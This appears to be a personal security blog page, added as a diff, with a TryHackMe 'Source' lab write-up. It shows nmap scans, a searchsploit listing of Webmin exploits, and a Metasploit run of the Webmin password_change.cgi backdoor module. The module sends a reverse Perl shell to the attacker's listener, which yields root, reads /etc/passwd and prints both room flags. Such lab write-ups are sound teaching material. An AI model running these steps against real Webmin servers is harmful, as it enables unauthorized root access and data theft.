@@ -1,0 +1,1031 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.20.2 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>TryHackMe - Source | Tri Wanda Septian’s Blog</title>
+<meta name="description" content="">
+
+
+  <meta name="author" content="Tri Wanda Septian">
+  
+  <meta property="article:author" content="Tri Wanda Septian">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Tri Wanda Septian's Blog">
+<meta property="og:title" content="TryHackMe - Source">
+<meta property="og:url" content="http://localhost:4000/tryhackme/thm-source/">
+
+
+  <meta property="og:description" content="">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/avatar_backup.png">
+
+
+
+  <meta name="twitter:site" content="@twseptian_">
+  <meta name="twitter:title" content="TryHackMe - Source">
+  <meta name="twitter:description" content="">
+  <meta name="twitter:url" content="http://localhost:4000/tryhackme/thm-source/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="http://localhost:4000/assets/images/avatar_backup.png">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2020-07-08T00:00:00+07:00">
+
+
+
+  <meta property="article:modified_time" content="2020-07-08T14:58:26+07:00">
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/tryhackme/thm-source/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Tri Wanda Septian's Blog and Stuff",
+      "url": "http://localhost:4000/",
+      "sameAs": ["https://twitter.com/twsepian_","https://github.com/twseptian"]
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="KJV9Ip5Mlud9lmDhN6pzfrcplPaoPSnsaOptFO6aIwE" />
+
+
+  <meta name="msvalidate.01" content="A990426F952EA8940B6F2C13C11817E3">
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Tri Wanda Septian's Blog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+
+    <!-- start custom head snippets -->
+<meta name="msvalidate.01" content="A990426F952EA8940B6F2C13C11817E3" />
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<link rel="apple-touch-icon" sizes="120x120" href="/assets/images/favicon/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon/favicon-16x16.png">
+<link rel="manifest" href="/assets/images/favicon/site.webmanifest">
+<link rel="mask-icon" href="/assets/images/favicon/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/ava.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          Tri Wanda Septian
+          <span class="site-subtitle">#neverstoplearning #lifelonglearning</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/">posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/">about me</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+    
+    <aside class="sidebar__top">
+      <a href="#site-nav"><i class="fas fa-chevron-circle-up fa-2x"></i></a>
+      </aside>
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/avatar_backup.png" alt="Tri Wanda Septian" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Tri Wanda Septian</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Researcher, Infosec practioner,<br />CTF Player, Perpetual Learner.</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Indonesia</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twseptian.github.io" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+          
+        
+          
+            <li><a href="mailto:twseptian@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/twseptian" rel="nofollow noopener noreferrer"><i class="fab fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://gitlab.com/twseptian/" rel="nofollow noopener noreferrer"><i class="fab fa-gitlab" aria-hidden="true"></i><span class="label">GitLab</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/twseptian_" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/twseptian/" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="TryHackMe - Source">
+    <meta itemprop="description" content="">
+    <meta itemprop="datePublished" content="2020-07-08T00:00:00+07:00">
+    <meta itemprop="dateModified" content="2020-07-08T14:58:26+07:00">
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">TryHackMe - Source
+</h1>
+          
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2020-07-08T00:00:00+07:00">July 8, 2020</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+
+          <section class="page__share">
+  
+    <!--<h4 class="page__share-title">Share on</h4>-->
+  
+
+  <a href="https://twitter.com/intent/tweet?via=twseptian_&text=TryHackMe+-+Source%20http%3A%2F%2Flocalhost%3A4000%2Ftryhackme%2Fthm-source%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Ftryhackme%2Fthm-source%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Ftryhackme%2Fthm-source%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a>
+  
+  <a href="https://www.buymeacoffee.com/twseptian"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=☕&slug=twseptian&button_colour=5F7FFF&font_colour=ffffff&font_family=Lato&outline_colour=000000&coffee_colour=FFDD00" width="160",height="160"></a>
+</section>
+
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#summary">Summary</a></li>
+  <li><a href="#network-scanning">Network Scanning</a></li>
+  <li><a href="#enumeration">Enumeration</a></li>
+  <li><a href="#explotation-using-metasploit">Explotation using metasploit</a></li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <p><img src="/assets/images/thm-source/86a06c335d734cf4a28f78f669cbb325.png" alt="4d0c40b22a8df7d858f324a32b6fcbe3.png" /></p>
+
+<p>Description about this room from THM</p>
+<blockquote>
+  <p>This virtual machine is also included in the room AttackerKB as part of a guided experience. Additionally, you can download the OVA of Source for offline usage from https://www.darkstar7471.com/resources.html</p>
+</blockquote>
+
+<h2 id="summary">Summary</h2>
+
+<p>This room is an easy to exploit and get the root access. In this machine we will learn about how to find the vulnerability using <code class="language-plaintext highlighter-rouge">searchploit</code> and how to use metaploit to get a shell from target, analyze <code class="language-plaintext highlighter-rouge">webmin</code> old version exploitation.</p>
+
+<h2 id="network-scanning">Network Scanning</h2>
+
+<p>For network scanning we use nmap with all information.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[twseptian@twsterlab] - [~/lab/THM/rooms/source] - [Wed Jul 08, 21:36]
+└─[$]&gt; sudo nmap -sC -sV -T4 -A -oN source.nmap 10.10.1.250
+[sudo] password for twseptian: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 21:36 WIB
+Nmap scan report for 10.10.1.250
+Host is up (0.25s latency).
+Not shown: 998 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
+|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
+|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
+10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=7/8%OT=22%CT=1%CU=41131%PV=Y%DS=2%DC=T%G=Y%TM=5F05DA38
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(
+OS:SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%TS=C)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3
+OS:=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=F4B3%W2=F
+OS:4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW
+OS:6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
+OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
+OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
+OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
+OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   319.19 ms 10.9.0.1
+2   319.35 ms 10.10.1.250
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 67.59 seconds
+</code></pre></div></div>
+
+<p>check vulnerability using option <code class="language-plaintext highlighter-rouge">--script vuln</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[twseptian@twsterlab] - [~/lab/THM/rooms/source] - [Wed Jul 08, 21:37]
+└─[$]&gt; sudo nmap -Pn --script vuln 10.10.1.250
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 21:38 WIB
+Stats: 0:00:55 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 98.44% done; ETC: 21:39 (0:00:00 remaining)
+Nmap scan report for 10.10.1.250
+Host is up (0.22s latency).
+Not shown: 998 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+10000/tcp open  snet-sensor-mgmt
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+| http-vuln-cve2006-3392: 
+|   VULNERABLE:
+|   Webmin File Disclosure
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2006-3392
+|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
+|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
+|       to bypass the removal of "../" directory traversal sequences.
+|       
+|     Disclosure date: 2006-06-29
+|     References:
+|       http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
+|       http://www.exploit-db.com/exploits/1997/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
+|_sslv2-drown: 
+
+Nmap done: 1 IP address (1 host up) scanned in 63.75 seconds
+</code></pre></div></div>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>searchploit webmin</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[twseptian@twsterlab] - [~/lab/THM/rooms/source] - [Wed Jul 08, 21:39]
+└─[$]&gt; searchsploit webmin
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                                                     | cgi/webapps/23535.txt
+phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                                                    | php/webapps/2462.txt
+phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                                                | php/webapps/2451.txt
+Webmin - Brute Force / Command Execution                                                                                            | multiple/remote/705.pl
+webmin 0.91 - Directory Traversal                                                                                                   | cgi/remote/21183.txt
+Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                                         | linux/remote/22275.pl
+Webmin 0.x - 'RPC' Privilege Escalation                                                                                             | linux/remote/21765.pl
+Webmin 0.x - Code Input Validation                                                                                                  | linux/local/21348.txt
+Webmin 1.5 - Brute Force / Command Execution                                                                                        | multiple/remote/746.pl
+Webmin 1.5 - Web Brute Force (CGI)                                                                                                  | multiple/remote/745.pl
+Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                               | unix/remote/21851.rb
+Webmin 1.850 - Multiple Vulnerabilities                                                                                             | cgi/webapps/42989.txt
+Webmin 1.900 - Remote Command Execution (Metasploit)                                                                                | cgi/remote/46201.rb
+Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                              | linux/remote/46984.rb
+Webmin 1.920 - Remote Code Execution                                                                                                | linux/webapps/47293.sh
+Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                                   | linux/remote/47230.rb
+Webmin 1.x - HTML Email Command Execution                                                                                           | cgi/webapps/24574.txt
+Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure (Perl)                                                                 | multiple/remote/2017.pl
+Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure (PHP)                                                                  | multiple/remote/1997.php
+Webmin &lt; 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                                       | linux/webapps/47330.rb
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+</code></pre></div></div>
+
+<h2 id="explotation-using-metasploit">Explotation using metasploit</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 &gt; search webmin
+
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
+   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
+   2  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
+   3  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
+   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
+   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
+
+
+Interact with a module by name or index, for example use 5 or use exploit/unix/webapp/webmin_upload_exec
+
+msf5 &gt; use exploit/linux/http/webmin_backdoor
+[*] Using configured payload cmd/unix/reverse_perl
+msf5 exploit(linux/http/webmin_backdoor) &gt; set rhosts 10.10.112.129
+rhosts =&gt; 10.10.112.129
+msf5 exploit(linux/http/webmin_backdoor) &gt; set lhost 10.9.19.3
+lhost =&gt; 10.9.19.3
+msf5 exploit(linux/http/webmin_backdoor) &gt; set ssl true
+[!] Changing the SSL option's value may require changing RPORT!
+ssl =&gt; true
+msf5 exploit(linux/http/webmin_backdoor) &gt; show options 
+
+Module options (exploit/linux/http/webmin_backdoor):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.112.129    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT      10000            yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        true             no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       Base path to Webmin
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.9.19.3        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (Unix In-Memory)
+
+
+msf5 exploit(linux/http/webmin_backdoor) &gt; run
+
+[*] Started reverse TCP handler on 10.9.19.3:4444 
+[*] Configuring Automatic (Unix In-Memory) target
+[*] Sending cmd/unix/reverse_perl command payload
+[*] Command shell session 1 opened (10.9.19.3:4444 -&gt; 10.10.112.129:51590) at 2020-07-08 23:10:30 +0700
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+python -c "import pty;pty.spawn('/bin/bash')"
+root@source:/usr/share/webmin/# cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+dark:x:1000:1000:Dark:/home/dark:/bin/bash
+root@source:/usr/share/webmin/# cd /home/dark
+cd /home/dark
+root@source:/home/dark# ls -la
+ls -la
+total 15228
+drwxr-xr-x 5 dark dark     4096 Jun 26 04:46 .
+drwxr-xr-x 3 root root     4096 Jun 26 04:37 ..
+-rw------- 1 dark dark        7 Jun 26 04:46 .bash_history
+-rw-r--r-- 1 dark dark      220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 dark dark     3771 Apr  4  2018 .bashrc
+drwx------ 2 dark dark     4096 Jun 26 04:38 .cache
+drwx------ 3 dark dark     4096 Jun 26 04:38 .gnupg
+drwxrwxr-x 3 dark dark     4096 Jun 26 04:43 .local
+-rw-r--r-- 1 dark dark      807 Apr  4  2018 .profile
+-rw-r--r-- 1 dark dark        0 Jun 26 04:38 .sudo_as_admin_successful
+-rw-rw-r-- 1 dark dark       29 Jun 26 04:44 user.txt
+-rw-rw-r-- 1 dark dark 15550066 Jun 26 04:18 webmin_1.890_all.deb
+root@source:/home/dark# cat user.txt
+cat user.txt
+THM{SUPPLY_CHAIN_COMPROMISE}
+root@source:/home/dark# cd /root
+cd /root
+root@source:~# ls -la 
+ls -la
+total 36
+drwx------  5 root root 4096 Jun 26 04:46 .
+drwxr-xr-x 24 root root 4096 Jun 26 04:42 ..
+-rw-------  1 root root   44 Jun 26 04:46 .bash_history
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  3 root root 4096 Jun 26 04:47 .gnupg
+drwxr-xr-x  3 root root 4096 Jun 26 04:46 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root 4096 Jun 26 04:37 .ssh
+-rw-r--r--  1 root root   25 Jun 26 04:46 root.txt
+root@source:~# cat root.txt
+cat root.txt
+THM{UPDATE_YOUR_INSTALL}
+root@source:~#
+</code></pre></div></div>
+<p>root flag
+<code class="language-plaintext highlighter-rouge">THM{UPDATE_YOUR_INSTALL}</code></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+  
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#tryhackme" class="page__taxonomy-item" rel="tag">TryHackMe</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-07-08">July 8, 2020</time></p>
+
+
+      </footer>
+      
+      
+  <nav class="pagination">
+    
+      <a href="/tryhackme/thm-easy-steganography/" class="pagination--pager" title="TryHackMe - Easy Steganography
+">Previous</a>
+    
+    
+      <a href="/hackthebox%20machine/htb-machine-magic/" class="pagination--pager" title="HackTheBox Machine - Magic
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/CEH-Practical-Logo.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/penetration%20testing/ceh%20practical/ceh_practical/" rel="permalink">Pengalaman Ujian Sertifikasi CEH Practical
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2022-01-16T15:19:00+07:00">January 16, 2022</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Berikut cerita pengalaman saya untuk lulus ujian CEH Practical yang ingin saya bagikan untuk orang yang sedang atau ingin mengambil sertifikasi CEH Practical.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/teaser.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/exploit-db/orrsv1.0-sql-injection/" rel="permalink">Online Railway Reservation System 1.0 - ‘id’ SQL Injection (Unauthenticated)
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2022-01-07T00:00:00+07:00">January 7, 2022</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
